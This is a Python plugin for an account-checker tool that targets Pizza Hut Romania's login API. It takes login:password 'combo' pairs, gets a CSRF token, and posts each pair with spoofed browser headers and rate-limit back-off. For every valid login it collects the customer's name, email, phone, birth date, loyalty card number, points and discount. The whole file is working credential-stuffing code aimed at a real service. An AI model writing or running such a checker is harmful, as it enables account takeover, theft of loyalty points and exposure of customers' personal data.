import asyncio
import re
import json
from typing import Dict, Optional
import aiohttp
from plugins.base import WebsitePlugin

class PizzaHutPlugin(WebsitePlugin):
    @property
    def name(self) -> str:
        return "pizzahut"
    
    @property
    def display_name(self) -> str:
        return "Pizza Hut"
    
    def __init__(self):
        self.base_url = "https://www.pizzahut.ro"
        self.headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.pizzahut.ro',
            'Referer': 'https://www.pizzahut.ro/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
    
    def parse_combo_line(self, login: str, password: str) -> Dict[str, str]:
        """Parse and normalize login credentials"""
        login = login.strip()
        password = password.strip()
        return {'login': login, 'password': password, 'original_login': login}
    
    async def get_csrf_token(self, session: aiohttp.ClientSession) -> Optional[tuple]:
        """Get CSRF token from main page"""
        try:
            async with session.get(
                self.base_url,
                headers=self.headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                # Extract XSRF-TOKEN from Set-Cookie header
                cookies = response.cookies
                xsrf_token = cookies.get('XSRF-TOKEN')
                
                if xsrf_token:
                    return xsrf_token.value, cookies
                return None
        except:
            return None
    
    async def check_account(self, session: aiohttp.ClientSession, login: str, password: str, original_login: str) -> Optional[Dict]:
        """Check a single account and return account info if valid"""
        try:
            # Create a new session for each account to get fresh CSRF token
            connector = aiohttp.TCPConnector(limit=1)
            async with aiohttp.ClientSession(connector=connector) as account_session:
                # First, get CSRF token
                token_data = await self.get_csrf_token(account_session)
                if not token_data:
                    return None
                
                xsrf_token, cookies = token_data
                
                # Prepare login request
                req_headers = self.headers.copy()
                req_headers['X-XSRF-TOKEN'] = xsrf_token
                
                # Set cookies
                cookie_str = '; '.join([f'{k}={v.value}' for k, v in cookies.items()])
                req_headers['Cookie'] = cookie_str
            
                login_payload = {
                    "email": login,
                    "password": password,
                    "rememberMe": False
                }
                
                async with account_session.post(
                    f'{self.base_url}/loginClient',
                    json=login_payload,
                    headers=req_headers,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    if response.status == 429:
                        print(f"\n[!] Rate limit detected (429). Waiting 5 seconds...")
                        await asyncio.sleep(5)
                        return None
                    elif response.status == 503:
                        print(f"\n[!] Service unavailable (503). Waiting 3 seconds...")
                        await asyncio.sleep(3)
                        return None
                    elif response.status >= 500:
                        print(f"\n[!] Server error ({response.status}). Waiting 2 seconds...")
                        await asyncio.sleep(2)
                        return None
                    
                    login_data = await response.json()
                    
                    # Check if login failed
                    if not login_data.get('sc', False):
                        return None
                    
                    data = login_data.get('data', {})
                    loyalty_card = data.get('loyaltyCard', {})
                    
                    if not data or not loyalty_card:
                        return None
                    
                    return {
                        'website': self.name,
                        'login': original_login,
                        'password': password,
                        'firstName': data.get('firstName', ''),
                        'lastName': data.get('lastName', ''),
                        'email': data.get('email', ''),
                        'phone': data.get('phone', ''),
                        'clientId': data.get('clientId', ''),
                        'birthDate': data.get('birthDate', ''),
                        'points': loyalty_card.get('points', 0),
                        'expiringPoints': loyalty_card.get('expiringPoints', 0),
                        'cardNumber': loyalty_card.get('cardNumber', ''),
                        'cardId': loyalty_card.get('id', ''),
                        'ruleName': loyalty_card.get('ruleName', ''),
                        'ruleDiscount': loyalty_card.get('ruleDiscount', '0.00'),
                        'validBonus': loyalty_card.get('validBonus', '0'),
                        'autoCredit': loyalty_card.get('autoCredit', '0.00'),
                        'cardStatus': loyalty_card.get('status', '1')
                    }
                
        except asyncio.TimeoutError:
            return None
        except aiohttp.ClientConnectorError:
            await asyncio.sleep(2)
            return None
        except Exception as e:
            return None
    
    def format_account_display(self, account: Dict) -> str:
        """Format account data for console display"""
        return f"{account['login']} | Points: {account['points']} | Card: {account['cardNumber']} | Discount: {account['ruleDiscount']}%"
    
    def get_balance_key(self) -> str:
        """Get the key name for balance/points in account data"""
        return 'points'
